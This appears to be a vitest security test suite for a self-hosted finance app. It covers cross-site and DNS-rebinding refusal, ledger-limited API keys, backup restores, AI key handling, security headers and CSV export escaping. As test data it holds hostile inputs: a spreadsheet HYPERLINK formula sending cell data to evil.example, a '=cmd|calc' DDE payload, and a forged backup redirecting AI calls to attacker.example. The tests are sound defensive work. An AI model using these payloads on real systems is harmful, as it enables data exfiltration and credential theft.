import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { createServer } from 'node:http'
import type { AddressInfo } from 'node:net'
import os from 'node:os'
import path from 'node:path'
import Database from 'better-sqlite3'
import { afterEach, describe, expect, it } from 'vitest'
import { transactionCreateSchema, type ApiKeyCreated } from '@chipmunk/shared'
import Anthropic from '@anthropic-ai/sdk'
import { describeError } from './ai/runner'
import { createApp, UPLOAD_LIMIT, type AppOptions } from './app'
import { isAllowedHost } from './api/auth'
import { SCALAR } from './api/openapi'
import { toCsv } from './routes/ledger'
import { envSettingsWarnings } from './services/settings'
import { createTransaction } from './services/transactions'
import { categoryId, makeAccount, testStorage } from './test/helpers'

type Json = any // eslint-disable-line @typescript-eslint/no-explicit-any

const SAME_ORIGIN = { 'sec-fetch-site': 'same-origin' }

function setup(opts: AppOptions = {}) {
  const storage = testStorage()
  const app = createApp(storage, { trustedHeader: null, ...opts })
  /** A request as a browser (or a script) would send it: `url` is the whole address, so the Host too. */
  const send = async (url: string, init: { method?: string; headers?: Record<string, string>; body?: unknown } = {}) => {
    const res = await app.request(url.startsWith('/') ? `http://localhost:8787${url}` : url, {
      method: init.method ?? 'GET',
      headers: { ...(init.body === undefined ? {} : { 'content-type': 'application/json' }), ...init.headers },
      body: init.body === undefined ? undefined : typeof init.body === 'string' ? init.body : JSON.stringify(init.body),
    })
    const text = await res.text()
    return { status: res.status, headers: res.headers, text, body: (text && res.headers.get('content-type')?.includes('json') ? JSON.parse(text) : undefined) as Json }
  }
  const web = (url: string, method = 'GET', body?: unknown) => send(url, { method, body, headers: SAME_ORIGIN })
  const key = async (input: { scopes: string[]; ledgers?: string[] }) => {
    const res = await web('/api/v1/api-keys', 'POST', { name: 'agent', ...input })
    expect(res.status).toBe(201)
    return { authorization: `Bearer ${(res.body as ApiKeyCreated).key}` }
  }
  return { storage, app, send, web, key }
}

describe('who may call the API without a key', () => {
  it('is only the app’s own page', async () => {
    const { send } = setup()
    const me = (headers: Record<string, string>, url = '/api/v1/me') => send(url, { headers })

    expect((await me(SAME_ORIGIN)).status).toBe(200)
    // A typed address or a download.
    expect((await me({ 'sec-fetch-site': 'none' })).status).toBe(200)
    // Another site, or a subdomain of this one.
    for (const site of ['cross-site', 'same-site']) {
      const res = await me({ 'sec-fetch-site': site, origin: 'https://evil.example' })
      expect(res.status).toBe(401)
      expect(res.body.error.message).toBe('Requests from outside the app need an API key. Send it as "Authorization: Bearer <key>".')
    }
    // Nothing to say where it came from: curl, or a script.
    expect((await me({})).status).toBe(401)

    // Browsers on plain HTTP (not localhost) send no Sec-Fetch-Site: the Origin, or else the Referer, must be this host.
    const lan = 'http://192.168.1.20:8787/api/v1/me'
    expect((await me({ origin: 'http://192.168.1.20:8787' }, lan)).status).toBe(200)
    expect((await me({ origin: 'http://192.168.1.20:5173' }, lan)).status).toBe(401)
    expect((await me({ origin: 'null' }, lan)).status).toBe(401)
    expect((await me({ referer: 'http://192.168.1.20:8787/settings/app' }, lan)).status).toBe(200)
    expect((await me({ referer: 'https://evil.example/' }, lan)).status).toBe(401)
    // A browser's Sec-Fetch-Site wins over a matching Origin.
    expect((await me({ 'sec-fetch-site': 'cross-site', origin: 'http://192.168.1.20:8787' }, lan)).status).toBe(401)
  })

  it('refuses the cross-site writes a form or a no-cors fetch could make', async () => {
    const { storage, send } = setup()
    makeAccount(storage.registry.defaultContext())
    const erase = await send('/api/v1/ledgers/personal/erase', {
      method: 'POST',
      headers: { 'content-type': 'text/plain', 'sec-fetch-site': 'cross-site', origin: 'https://evil.example' },
      body: '{"confirm":"erase","x":"="}',
    })
    expect(erase.status).toBe(401)
    expect((await send('/api/v1/api-keys', { method: 'POST', body: { name: 'x', scopes: ['admin'] }, headers: { origin: 'https://evil.example' } })).status).toBe(401)
    expect(storage.registry.defaultContext().sqlite.prepare('SELECT count(*) AS n FROM accounts').get()).toEqual({ n: 1 })
  })

  it('answers only at its own host names (DNS rebinding)', async () => {
    const { send, key } = setup()
    const res = await send('http://attacker.example:8787/api/v1/backup/full', { headers: SAME_ORIGIN })
    expect(res.status).toBe(403)
    expect(res.body.error.message).toMatch(/not attacker\.example\. To use the app at that name, add it to ALLOWED_HOSTS/)
    // A key works at any name.
    expect((await send('http://attacker.example:8787/api/v1/me', { headers: await key({ scopes: ['read'] }) })).status).toBe(200)

    for (const host of ['127.0.0.1', '192.168.1.20', '[::1]', 'localhost', 'app.localhost', 'nas', 'nas.local', 'nas.lan', 'nas.home.arpa', 'box.internal', 'mac.tail1234.ts.net']) {
      expect([host, (await send(`http://${host}:8787/api/v1/me`, { headers: SAME_ORIGIN })).status]).toEqual([host, 200])
    }
  })

  it('takes more host names from ALLOWED_HOSTS', async () => {
    const { send } = setup({ allowedHosts: ['money.example.com', '.home.example'] })
    const status = async (host: string) => (await send(`https://${host}/api/v1/me`, { headers: SAME_ORIGIN })).status
    expect(await status('money.example.com')).toBe(200)
    expect(await status('other.example.com')).toBe(403)
    expect(await status('home.example')).toBe(200)
    expect(await status('money.home.example')).toBe(200)
    expect(await status('evilhome.example')).toBe(403)

    expect(isAllowedHost('LOCALHOST.')).toBe(true)
    expect(isAllowedHost('localhost.evil.example')).toBe(false)
    expect(isAllowedHost('local.evil.example')).toBe(false)
    expect(isAllowedHost('')).toBe(false)
  })

  it('still needs the trusted header when one is configured', async () => {
    const { send } = setup({ trustedHeader: 'Tailscale-User-Login' })
    const me = (headers: Record<string, string>) => send('https://mac.tail1234.ts.net/api/v1/me', { headers })
    expect((await me(SAME_ORIGIN)).status).toBe(401)
    expect((await me({ ...SAME_ORIGIN, 'tailscale-user-login': 'me@example.com' })).status).toBe(200)
    // Behind Tailscale Serve, another site's request carries the header too.
    expect((await me({ 'sec-fetch-site': 'cross-site', 'tailscale-user-login': 'me@example.com' })).status).toBe(401)
    expect((await send('http://attacker.example/api/v1/me', { headers: { ...SAME_ORIGIN, 'tailscale-user-login': 'x' } })).status).toBe(403)
    // A key doesn't need it.
    const auth = await send('https://mac.tail1234.ts.net/api/v1/api-keys', {
      method: 'POST',
      body: { name: 'agent', scopes: ['read'] },
      headers: { ...SAME_ORIGIN, 'tailscale-user-login': 'me@example.com' },
    })
    expect((await me({ authorization: `Bearer ${auth.body.key}` })).status).toBe(200)
  })

  it('treats a proxy’s Basic sign-in as no key at all', async () => {
    const { send } = setup()
    const basic = { authorization: 'Basic dXNlcjpwYXNz' }
    // The browser sends it on every request after signing in to the proxy: the page still works.
    expect((await send('/api/v1/me', { headers: { ...basic, ...SAME_ORIGIN } })).status).toBe(200)
    // It's no way in for anything else.
    expect((await send('/api/v1/me', { headers: basic })).status).toBe(401)
    expect((await send('/api/v1/me', { headers: { ...basic, 'sec-fetch-site': 'cross-site' } })).status).toBe(401)
    // A Bearer value that isn't a key is still refused, from the page too.
    expect((await send('/api/v1/me', { headers: { authorization: 'Bearer', ...SAME_ORIGIN } })).status).toBe(401)
    expect((await send('/api/v1/me', { headers: { authorization: 'Bearer cm_nope', ...SAME_ORIGIN } })).status).toBe(401)
  })

  it('leaves MCP to API keys', async () => {
    const { send, key } = setup()
    expect((await send('/mcp', { method: 'POST', headers: SAME_ORIGIN, body: '{}' })).status).toBe(401)
    const auth = await key({ scopes: ['read'] })
    const res = await send('/mcp', {
      method: 'POST',
      headers: { ...auth, accept: 'application/json, text/event-stream' },
      body: { jsonrpc: '2.0', id: 1, method: 'initialize', params: { protocolVersion: '2025-06-18', capabilities: {}, clientInfo: { name: 't', version: '1' } } },
    })
    expect(res.status).toBe(200)
  })
})

describe('keys limited to some ledgers', () => {
  it('can’t do what’s for the whole app', async () => {
    const { web, send, key } = setup()
    await web('/api/v1/ledgers', 'POST', { name: 'Family', start: 'empty' })
    const limited = await key({ scopes: ['admin'], ledgers: ['family'] })
    const unlimited = await key({ scopes: ['admin'] })
    const appWide: Array<[string, string, unknown?]> = [
      ['GET', '/api-keys'],
      ['POST', '/api-keys', { name: 'escape', scopes: ['admin'] }],
      ['DELETE', '/api-keys/nope'],
      ['GET', '/backup/full'],
      ['PATCH', '/settings', { timezone: 'UTC' }],
      ['POST', '/settings/ai/test', { slot: 'primary' }],
      ['GET', '/settings/ai/chatgpt'],
      ['POST', '/ledgers', { name: 'Mine' }],
      ['GET', '/bank/connections'],
      ['POST', '/bank/connections', { setupToken: 'aHR0cHM6Ly9leGFtcGxlLmNvbS9jbGFpbQ==' }],
      ['PATCH', '/bank/connections/nope', { name: 'x' }],
      ['DELETE', '/bank/connections/nope'],
      ['POST', '/bank/plaid/link-token', {}],
      ['GET', '/payees/name-rules'],
      ['GET', '/payees/tidy'],
      ['PUT', '/payees/tidy', { enabled: false }],
    ]
    appWide.push(['POST', '/ledgers/family/payees/rename', { payee: 'Coffee', name: 'Café' }])
    for (const [method, url, body] of appWide) {
      const res = await send(`/api/v1${url}`, { method, body, headers: limited })
      expect([method, url, res.status, res.body?.error.message]).toEqual([method, url, 403, 'That’s for the whole app, so a key limited to some ledgers can’t use it.'])
    }
    // Their own ledger is fine.
    expect((await send('/api/v1/ledgers/family/accounts', { headers: limited })).status).toBe(200)
    expect((await send('/api/v1/settings', { headers: limited })).status).toBe(200)
    // An unlimited key and the web app can do all of it.
    for (const auth of [unlimited, SAME_ORIGIN]) {
      expect((await send('/api/v1/api-keys', { headers: auth })).status).toBe(200)
      expect((await send('/api/v1/backup/full', { headers: auth })).status).toBe(200)
      expect((await send('/api/v1/settings', { method: 'PATCH', body: { timezone: 'UTC' }, headers: auth })).status).toBe(200)
      expect((await send('/api/v1/bank/connections', { headers: auth })).status).toBe(200)
      expect((await send('/api/v1/payees/name-rules', { headers: auth })).status).toBe(200)
    }
  })

  it('can’t make their ledger the one the app opens', async () => {
    const { web, send, key } = setup()
    await web('/api/v1/ledgers', 'POST', { name: 'Family', start: 'empty' })
    const limited = await key({ scopes: ['admin'], ledgers: ['family'] })
    const res = await send('/api/v1/ledgers/family', { method: 'PATCH', body: { isDefault: true }, headers: limited })
    expect(res.status).toBe(403)
    expect((await send('/api/v1/ledgers/family', { method: 'PATCH', body: { color: '#16a34a' }, headers: limited })).status).toBe(200)
    expect((await web('/api/v1/ledgers/family', 'PATCH', { isDefault: true })).body.isDefault).toBe(true)
  })

  it('can’t change which ledger opens by archiving, deleting or reordering it', async () => {
    const { storage, web, send, key } = setup()
    await web('/api/v1/ledgers', 'POST', { name: 'Family', start: 'empty' })
    const limited = await key({ scopes: ['admin'], ledgers: ['personal'] })
    const personal = (method: string, body: unknown) => send('/api/v1/ledgers/personal', { method, body, headers: limited })
    expect((await personal('PATCH', { archived: true })).status).toBe(403)
    expect((await personal('PATCH', { sort: 5 })).status).toBe(403)
    expect((await personal('DELETE', { confirm: 'Personal' })).status).toBe(403)
    expect(storage.registry.defaultLedger().slug).toBe('personal')
    // Once another ledger opens, theirs is theirs to archive or delete.
    await web('/api/v1/ledgers/family', 'PATCH', { isDefault: true })
    expect((await personal('PATCH', { archived: true })).status).toBe(200)
    expect((await personal('DELETE', { confirm: 'Personal' })).status).toBe(200)
  })

  it('see category counts and sync banks only for their ledgers', async () => {
    const { storage, web, send, key } = setup()
    await web('/api/v1/ledgers', 'POST', { name: 'Family', start: 'empty' })
    const limited = await key({ scopes: ['write'], ledgers: ['family'] })
    const personal = storage.registry.defaultContext()
    const coffee = categoryId(personal, 'Groceries')
    await createTransaction(personal, transactionCreateSchema.parse({ accountId: makeAccount(personal), date: '2026-09-01', amountMinor: -500, payee: 'Cafe', categoryId: coffee }), { useAi: false })
    const used = async (auth: Record<string, string>) =>
      (await send('/api/v1/categories', { headers: auth })).body.categories.find((x: Json) => x.id === coffee).transactionCount
    expect(await used(SAME_ORIGIN)).toBe(1)
    expect(await used(limited)).toBe(0)

    // A connection feeding another ledger is left out, not half-synced and then refused.
    const meta = storage.meta.sqlite
    meta.prepare(`INSERT INTO bank_connections (id, provider, name, secret) VALUES ('c1', 'simplefin', 'Bank', 'x')`).run()
    meta.prepare(`INSERT INTO bank_accounts (id, connection_id, remote_id, name, currency, ledger_id, account_id) VALUES ('b1', 'c1', 'r1', 'Chequing', 'CAD', ?, 1)`).run(personal.ledger.id)
    const res = await send('/api/v1/bank/sync', { method: 'POST', headers: limited })
    expect([res.status, res.body]).toEqual([200, []])
  })

  it('only use bank accounts already syncing into their ledger', async () => {
    const { storage, web, send, key } = setup()
    await web('/api/v1/ledgers', 'POST', { name: 'Family', start: 'empty' })
    const limited = await key({ scopes: ['admin'], ledgers: ['family'] })
    const family = storage.registry.get('family')
    const mine = (await send('/api/v1/ledgers/family/accounts', { method: 'POST', body: { name: 'Joint', type: 'chequing', institution: 'Bank' }, headers: limited })).body.id
    const meta = storage.meta.sqlite
    meta.prepare(`INSERT INTO bank_connections (id, provider, name, secret) VALUES ('c1', 'simplefin', 'Bank', 'x')`).run()
    const insert = meta.prepare(`INSERT INTO bank_accounts (id, connection_id, remote_id, name, currency, ledger_id, account_id) VALUES (?, 'c1', ?, ?, 'CAD', ?, ?)`)
    insert.run('someone-elses', 'r1', 'Private chequing', null, null)
    insert.run('joint', 'r2', 'Joint chequing', family.id, mine)

    const listed = (auth: Record<string, string>) => send('/api/v1/ledgers/family/bank-accounts', { headers: auth }).then((r) => r.body.map((b: Json) => b.id))
    expect(await listed(limited)).toEqual(['joint'])
    expect((await listed(SAME_ORIGIN)).sort()).toEqual(['joint', 'someone-elses'])
    const message = 'A key limited to some ledgers can only use bank accounts already syncing into this ledger. Link others in the app.'
    const attempts: Array<[string, string, unknown]> = [
      ['POST', '/accounts', { name: 'Grab', type: 'chequing', bank: { bankAccountId: 'someone-elses' } }],
      ['PUT', `/accounts/${mine}/bank`, { bankAccountId: 'someone-elses' }],
      ['POST', `/accounts/${mine}/bank/preview`, { bankAccountId: 'someone-elses' }],
      ['POST', `/accounts/${mine}/bank/switch`, { bankAccountId: 'someone-elses', from: '2026-01-01', version: 'v', pairs: [] }],
    ]
    for (const [method, url, body] of attempts) {
      const res = await send(`/api/v1/ledgers/family${url}`, { method, body, headers: limited })
      expect([url, res.status, res.body?.error.message]).toEqual([url, 403, message])
    }
    expect(meta.prepare(`SELECT ledger_id FROM bank_accounts WHERE id = 'someone-elses'`).get()).toEqual({ ledger_id: null })
  })

  it('can’t add to the shared category list or change app settings by restoring a backup', async () => {
    const { storage, app, web, key } = setup()
    await web('/api/v1/ledgers', 'POST', { name: 'Family', start: 'empty' })
    const limited = await key({ scopes: ['admin'], ledgers: ['family'] })
    const backup = await app.request('http://localhost:8787/api/v1/ledgers/family/backup', { headers: SAME_ORIGIN })
    expect(backup.status).toBe(200)
    // The backup as someone might make it by hand: from another category list, with a category this one doesn't have and app settings.
    const dir = mkdtempSync(path.join(os.tmpdir(), 'st-sec-'))
    const file = path.join(dir, 'family.db')
    writeFileSync(file, new Uint8Array(await backup.arrayBuffer()))
    const db = new Database(file)
    db.prepare(`DELETE FROM settings WHERE key = 'categories.catalog'`).run()
    db.prepare(`INSERT INTO categories (name) VALUES ('Added by a backup')`).run()
    db.prepare(`INSERT INTO settings (key, value) VALUES ('ai.primary', ?), ('timezone', '"Pacific/Kiritimati"')`).run(
      JSON.stringify({ kind: 'openai-compatible', model: 'm', baseUrl: 'http://attacker.example/v1', apiKey: null }),
    )
    db.close()
    const bytes = readFileSync(file)
    rmSync(dir, { recursive: true, force: true })
    const before = (await web('/api/v1/settings')).body
    const restore = (auth: Record<string, string>) =>
      app.request('http://localhost:8787/api/v1/ledgers/family/restore', { method: 'POST', headers: { ...auth, 'content-type': 'application/octet-stream' }, body: bytes })
    const shared = () => storage.meta.sqlite.prepare(`SELECT count(*) AS n FROM categories WHERE name = 'Added by a backup'`).get()

    const refused = await restore(limited)
    expect(refused.status).toBe(403)
    expect(((await refused.json()) as Json).error.message).toBe('This backup has categories the shared list doesn’t, and a key limited to some ledgers can’t add to it. Restore it in the app.')
    expect(shared()).toEqual({ n: 0 })

    // The app may add to the list, but a backup's app settings are never taken.
    expect((await restore(SAME_ORIGIN)).status).toBe(200)
    expect(shared()).toEqual({ n: 1 })
    const after = (await web('/api/v1/settings')).body
    expect([after.timezone, after.ai.primary]).toEqual([before.timezone, null])
    expect(before.timezone).not.toBe('Pacific/Kiritimati')
  })
})

describe('AI provider keys', () => {
  const servers: Array<{ close: () => void }> = []
  afterEach(() => servers.splice(0).forEach((s) => s.close()))

  it('stay with the provider and server they were saved for', async () => {
    const { web } = setup()
    const save = async (primary: object) => (await web('/api/v1/settings', 'PATCH', { ai: { primary } })).body.ai.primary
    expect(await save({ kind: 'openai', model: 'gpt-5-mini', apiKey: 'sk-real-1234' })).toMatchObject({ hasApiKey: true })
    // Same provider: kept.
    expect(await save({ kind: 'openai', model: 'gpt-5' })).toMatchObject({ hasApiKey: true, apiKeyHint: '••••1234' })
    // Another provider, without a key: forgotten.
    expect(await save({ kind: 'openai-compatible', model: 'm', baseUrl: 'http://127.0.0.1:9/v1' })).toMatchObject({ hasApiKey: false })

    expect(await save({ kind: 'openai-compatible', model: 'm', baseUrl: 'http://nas:1234/v1', apiKey: 'sk-nas-5678' })).toMatchObject({ hasApiKey: true })
    // Another path on the same server: kept. Another server: forgotten.
    expect(await save({ kind: 'openai-compatible', model: 'm', baseUrl: 'http://nas:1234/api/v1' })).toMatchObject({ hasApiKey: true })
    expect(await save({ kind: 'openai-compatible', model: 'm', baseUrl: 'http://nas:4321/api/v1' })).toMatchObject({ hasApiKey: false })
  })

  it('test errors say the status, not what the server sent', async () => {
    const seen: Array<string | undefined> = []
    const server = createServer((req, res) => {
      seen.push(req.headers.authorization)
      res.writeHead(400, { 'content-type': 'text/plain' })
      res.end('internal body leaked: hello from internal service')
    })
    await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve))
    servers.push(server)
    const { web } = setup()
    const baseUrl = `http://127.0.0.1:${(server.address() as AddressInfo).port}/v1`
    await web('/api/v1/settings', 'PATCH', { ai: { primary: { kind: 'openai', model: 'gpt-5-mini', apiKey: 'sk-real-secret' } } })
    await web('/api/v1/settings', 'PATCH', { ai: { primary: { kind: 'openai-compatible', model: 'm', baseUrl } } })
    const res = await web('/api/v1/settings/ai/test', 'POST', { slot: 'primary' })
    expect(res.body).toMatchObject({ ok: false, error: '400 · The provider refused the request. Check the model name.' })
    expect(res.text).not.toContain('leaked')
    expect(seen.length).toBeGreaterThan(0)
    expect(seen.join()).not.toContain('sk-real-secret')
  })
})

describe('AI provider errors', () => {
  it('say what a hosted provider said, and only the status for a server you chose', () => {
    const err = () => Anthropic.APIError.generate(400, { type: 'error', error: { type: 'invalid_request_error', message: 'Your credit balance is too low' } }, undefined, new Headers())
    expect(describeError(err(), { kind: 'anthropic', baseUrl: null })).toBe('400 · Your credit balance is too low')
    expect(describeError(err(), { kind: 'openai-compatible', baseUrl: 'http://nas:1234/v1' })).toBe('400 · The provider refused the request. Check the model name.')
    expect(describeError(err(), { kind: 'openai', baseUrl: 'http://elsewhere.example/v1' })).toBe('400 · The provider refused the request. Check the model name.')
    expect(describeError(err())).toBe('400 · The provider refused the request. Check the model name.')
  })
})

describe('request size', () => {
  it('is limited, with more room for restores and imports', async () => {
    const { web } = setup()
    const big = { name: 'x'.repeat(1024 * 1024 + 1) }
    const res = await web('/api/v1/ledgers', 'POST', big)
    expect(res.status).toBe(413)
    expect(res.body.error).toEqual({ code: 'payload_too_large', message: 'That request is too big. The most it can send is 1 MB.' })
    // A restore of a few MB gets as far as reading the file (it isn't a backup).
    const restore = await web('/api/v1/ledgers/personal/restore', 'POST', 'x'.repeat(3 * 1024 * 1024))
    expect(restore.status).toBe(400)
    expect(UPLOAD_LIMIT).toBe(200 * 1024 * 1024)
  })
})

describe('security headers', () => {
  it('locks down API responses and the docs page', async () => {
    const { send, web } = setup()
    const api = await web('/api/v1/me')
    expect(api.headers.get('x-content-type-options')).toBe('nosniff')
    expect(api.headers.get('x-frame-options')).toBe('DENY')
    expect(api.headers.get('referrer-policy')).toBe('same-origin')
    expect(api.headers.get('content-security-policy')).toMatch(/^default-src 'none'; frame-ancestors 'none'/)
    // Errors too.
    expect((await send('/api/v1/me')).headers.get('content-security-policy')).toMatch(/^default-src 'none'/)

    const docs = await send('/api/docs')
    expect(docs.text).toContain(`<script src="${SCALAR.src}" integrity="${SCALAR.integrity}" crossorigin="anonymous">`)
    expect(SCALAR.src).toMatch(/@scalar\/api-reference@\d+\.\d+\.\d+\//)
    const csp = docs.headers.get('content-security-policy')!
    expect(csp).toContain(`script-src ${SCALAR.src} 'sha256-`)
    expect(csp).toContain("connect-src 'self'")
    expect(csp).toContain("frame-ancestors 'none'")
  })
})

describe('the web app’s files', () => {
  const dirs: string[] = []
  afterEach(() => dirs.splice(0).forEach((d) => rmSync(d, { recursive: true, force: true })))

  it('caches hashed files for good, checks the rest, and never answers a missing file with the app', async () => {
    const dist = mkdtempSync(path.join(os.tmpdir(), 'st-web-'))
    dirs.push(dist)
    mkdirSync(path.join(dist, 'assets'))
    writeFileSync(path.join(dist, 'index.html'), '<!doctype html><script>document.title = "x"</script><script type="module" src="/assets/index-abc123.js"></script>')
    writeFileSync(path.join(dist, 'assets/index-abc123.js'), 'console.log(1)')
    writeFileSync(path.join(dist, 'sw.js'), 'self.x = 1')
    writeFileSync(path.join(dist, 'manifest.webmanifest'), '{}')
    const { send } = setup({ serveWeb: true, webDist: dist })

    const asset = await send('/assets/index-abc123.js')
    expect([asset.status, asset.headers.get('cache-control')]).toEqual([200, 'public, max-age=31536000, immutable'])
    for (const file of ['/sw.js', '/manifest.webmanifest', '/', '/l/personal/transactions']) {
      expect([file, (await send(file)).headers.get('cache-control')]).toEqual([file, 'no-cache'])
    }
    expect((await send('/assets/index-old999.js')).status).toBe(404)

    const page = await send('/l/personal/transactions')
    expect(page.text).toContain('document.title')
    const csp = page.headers.get('content-security-policy')!
    expect(csp).toMatch(/script-src 'self' 'sha256-[A-Za-z0-9+/=]+' https:\/\/cdn\.plaid\.com;/)
    expect(csp).toContain("connect-src 'self' https://*.plaid.com")
    expect(csp).toContain("frame-src https://cdn.plaid.com https://*.plaid.com")
    expect(csp).toContain("frame-ancestors 'none'")
  })
})

describe('health check', () => {
  it('fails when the app database can’t be read', async () => {
    const { storage, send } = setup()
    expect((await send('/healthz')).status).toBe(200)
    storage.meta.sqlite.close()
    const res = await send('/healthz')
    expect(res.status).toBe(503)
    expect(res.body.ok).toBe(false)
  })
})

describe('CSV export', () => {
  it('keeps text that looks like a formula as text', async () => {
    const csv = toCsv([
      { date: '2026-10-01', payee: '=HYPERLINK("http://evil.example/?x="&A1,"click")', notes: '@SUM(1+1)', tags: '+1', category: '-x', amount: '-12.34' },
      { date: '2026-10-02', payee: '\tTab', notes: 'one\rtwo', tags: 'a', category: 'Groceries', amount: '5.00' },
    ])
    expect(csv.split('\n')).toEqual([
      'date,payee,notes,tags,category,amount',
      `2026-10-01,"'=HYPERLINK(""http://evil.example/?x=""&A1,""click"")",'@SUM(1+1),'+1,'-x,-12.34`,
      `2026-10-02,'\tTab,"one\rtwo",a,Groceries,5.00`,
    ])
  })

  it('in the export route', async () => {
    const { storage, web } = setup()
    const ctx = storage.registry.defaultContext()
    const tx = transactionCreateSchema.parse({ accountId: makeAccount(ctx), date: '2026-10-01', amountMinor: -1_234, payee: '=cmd|calc', notes: '@here' })
    await createTransaction(ctx, tx, { useAi: false })
    const res = await web('/api/v1/ledgers/personal/export/transactions.csv')
    const row = res.text.split('\n')[1]!
    expect(row).toContain(",'=cmd|calc,")
    expect(row).toContain(",'@here,")
    // The amount is a number, left alone.
    expect(row).toMatch(/,-12\.34$/)
  })
})

describe('account currencies', () => {
  it('are three-letter codes, so nothing like a formula gets in', async () => {
    const { web } = setup()
    const add = (currency: string) => web('/api/v1/ledgers/personal/accounts', 'POST', { name: 'Card', type: 'credit', institution: 'Bank', currency })
    expect((await add('=A1')).status).toBe(400)
    expect((await add('usd')).body.currency).toBe('USD')
  })
})

describe('environment settings', () => {
  it('are warned about at startup when they can’t be used', () => {
    const keys = ['AI_PRIMARY_KIND', 'AI_PRIMARY_MODEL', 'AI_FALLBACK_KIND', 'AI_FALLBACK_MODEL', 'PLAID_ENV', 'PLAID_CLIENT_ID', 'PLAID_SECRET'] as const
    const saved = Object.fromEntries(keys.map((k) => [k, process.env[k]]))
    try {
      Object.assign(process.env, { AI_PRIMARY_KIND: 'claude', AI_PRIMARY_MODEL: 'm', AI_FALLBACK_KIND: 'openai', PLAID_ENV: 'live', PLAID_CLIENT_ID: 'id', PLAID_SECRET: 's' })
      delete process.env.AI_FALLBACK_MODEL
      const warnings = envSettingsWarnings()
      expect(warnings).toHaveLength(3)
      expect(warnings[0]).toMatch(/^AI_PRIMARY_KIND is "claude", which isn't a provider this app knows/)
      expect(warnings[1]).toBe("AI_FALLBACK_KIND is set but AI_FALLBACK_MODEL isn't, so it's ignored. Set the model too.")
      expect(warnings[2]).toMatch(/^PLAID_ENV is "live"/)
      // Without the keys it goes with, it's not used at all.
      delete process.env.PLAID_SECRET
      expect(envSettingsWarnings()).toHaveLength(2)
    } finally {
      for (const k of keys) {
        if (saved[k] === undefined) delete process.env[k]
        else process.env[k] = saved[k]
      }
    }
  })
})
